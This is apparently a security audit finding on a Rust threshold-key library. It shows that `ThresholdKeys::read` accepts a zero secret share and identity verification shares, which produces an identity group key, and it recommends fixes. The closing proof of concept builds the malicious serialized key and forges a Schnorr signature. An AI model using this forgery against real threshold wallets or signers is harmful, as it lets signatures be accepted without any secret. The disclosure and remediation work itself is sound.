### Title
Malformed `ThresholdKeys` can deserialize to an identity group key, enabling signature forgery - (File: `crypto/dkg/src/lib.rs`)

### Summary
`ThresholdKeys::read` accepts a zero secret share and identity verification shares because it uses canonical scalar/point decoding without rejecting identity elements. `ThresholdKeys::new` then derives the group key directly from the supplied verification shares without checking that the local secret share matches its claimed public share or rejecting an identity aggregate key. The resulting object can represent a threshold wallet whose public key is the identity and whose effective private key is zero, allowing signatures under that key to be forged for arbitrary messages.

### Finding Description
During deserialization, `ThresholdKeys::read` reads `t`, `n`, and `i`, then reads `secret_share` with `C::read_F` and all `n` verification shares with `<C as Ciphersuite>::read_G`. [1](#0-0)  The generic `read_F` implementation accepts every canonical field representation, including zero, and `read_G` accepts every canonical group encoding, including identity. [2](#0-1) 

`ThresholdKeys::new` validates the number and range of verification-share indexes and the applicability of interpolation, but it does not reject identity points or verify `C::generator() * secret_share == verification_shares[i]`. [3](#0-2)  It calculates `group_key` by interpolating the first `t` supplied verification shares, so a `1-of-1` object containing the identity verification share produces the identity group key. [4](#0-3) 

For a Schnorr verification equation `R + cA - sG == 0`, setting `A` to the identity lets anyone choose scalar `s`, set `R = sG`, and satisfy the equation for any challenge `c`. [5](#0-4) 

### Impact Explanation
An attacker who can cause an application to deserialize attacker-controlled `ThresholdKeys` bytes can cause it to construct a syntactically valid threshold-key object whose group public key is the identity. Any protocol which then trusts `group_key()` as the wallet or signer identity accepts signatures that require no threshold participation and no secret knowledge. This is a forged-signature analog of memory-object corruption: crafted input creates an internally inconsistent security object that normal signature verification treats as valid.

### Likelihood Explanation
The malicious encoding is fully canonical and does not exploit parser corruption, invalid points, or out-of-range participant IDs. For a `1-of-1` key, the attacker only needs a zero scalar and the canonical identity point; `ThresholdParams::new` accepts `t = n = i = 1`. [6](#0-5)  The attack depends on an integration accepting serialized `ThresholdKeys` from an unprivileged party, which is the reachable input class being evaluated.

### Recommendation
Reject identity verification shares and a zero `secret_share` in `ThresholdKeys::new` or during `ThresholdKeys::read`. Also verify that the supplied local secret share matches `verification_shares[i]`, and reject a derived `group_key` equal to identity before constructing the `ThresholdKeys` object. Using the stricter `Curve::read_G` behavior, which rejects identity points, for FROST key material would prevent the identity-point component of this issue. [7](#0-6) 

### Proof of Concept
The following conceptual Rust constructs the malicious serialized object described above and demonstrates the forged verification relation:

```rust
use zeroize::Zeroizing;
use ciphersuite::{group::{Group, GroupEncoding, ff::PrimeField}, Ciphersuite};
use dkg::ThresholdKeys;
use schnorr::SchnorrSignature;

fn forge<C: Ciphersuite>() -> std::io::Result<()> {
  let mut bytes = Vec::new();

  // Curve ID.
  bytes.extend(u32::try_from(C::ID.len()).unwrap().to_le_bytes());
  bytes.extend(C::ID);

  // t = 1, n = 1, i = 1.
  bytes.extend(1u16.to_le_bytes());
  bytes.extend(1u16.to_le_bytes());
  bytes.extend(1u16.to_le_bytes());

  // Lagrange interpolation.
  bytes.push(1);

  // secret_share = 0.
  bytes.extend(C::F::ZERO.to_repr().as_ref());

  // verification_shares[1] = identity.
  bytes.extend(C::G::identity().to_bytes().as_ref());

  let keys = ThresholdKeys::<C>::read(&mut bytes.as_slice())?;
  assert!(bool::from(keys.group_key().is_identity()));

  // For any protocol-derived challenge c for an arbitrary message:
  let c = C::F::ONE;
  let s = C::F::ONE;
  let forged = SchnorrSignature::<C> { R: C::generator() * s, s };

  // R + cA - sG = G + cI - G = I.
  assert!(forged.verify(keys.group_key(), c));
  Ok(())
}
```

The private-key equivalent is zero because every verification share is identity, so the threshold object signs and verifies as a key whose discrete logarithm is publicly known.
